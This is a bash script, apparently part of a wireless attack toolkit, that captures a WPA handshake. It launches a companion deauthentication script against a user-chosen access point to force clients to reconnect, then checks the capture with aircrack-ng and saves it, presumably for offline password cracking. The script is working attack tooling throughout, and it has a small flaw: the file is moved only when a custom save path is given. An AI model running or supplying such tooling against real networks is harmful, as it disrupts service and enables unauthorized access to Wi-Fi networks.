#!/bin/bash

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
bold=$(tput bold)
tdef=$(tput sgr0)

bssid="null"
ch="null"
iface="null"

s_info () {
    printf "Capture WPA handshake"
    exit 0
}

get_input () {
    read -p "${green}${bold}>${tdef} " input
}

start () {
    printf "Enter timeout (seconds) [Preferred: 60]:\n"
    get_input

    tmout="$input"

    printf "Do not close the windows manually.\n"
    printf "Started attack to ${bold}${bssid}${tdef}.\n\n"

    xterm -fg red -bg black -hold -e "${SCRIPT_DIR}/0deauth.sh --bssid $bssid --ch $ch --iface $iface" &> /dev/null &
    ppid=$!

    sleep "$tmout"

    killall attack-loop.sh &> /dev/null
    killall client-loop.sh &> /dev/null
    killall xterm &> /dev/null

    enf="$(aircrack-ng clients-01.cap | grep -E -o "[0-9]+ handshake" | grep -E -o "[0-9]+")"
    if [[ "$enf" != "0" && "$enf" != "" ]]
    then
        defpth="/tmp/handshake.cap"
        printf "Handshake captured! Save .cap file to [Default: ${bold}${defpth}${tdef}]:\n"
        get_input
        
        if [[ "$input" = "" ]]
        then
            svpt="${defpth}"
        else
            svpt="${input}"
            svd="$(dirname $input)"
            if [ ! -d "$svd" ]
            then
                printf "Invalid directory. Saving file to the default path instead.\n"
                svpt="${defpth}"
            fi
            mv "clients-01.cap" "$svpt"
        fi
    else
        printf "Handshake not found. Try increasing the timeout or selecting an ap with active clients.\n"
        exit
    fi

    read -p "Press Return to end the attack. "
    
    printf "\n"
}

main () {
    while test $# -gt 0
    do
        if [ $1 = "--info" ]
        then
            s_info
        elif [ $1 = "--bssid" ]
        then
            bssid="$2"
        elif [ $1 = "--ch" ]
        then
            ch="$2"
        elif [ $1 = "--iface" ]
        then
            iface="$2"
        fi

        shift
    done

    if [[  $bssid = "null" || $bssid = "[null]" ]]
    then
        printf "BSSID not found.\n"
        exit 0
    fi

    start
}

main $@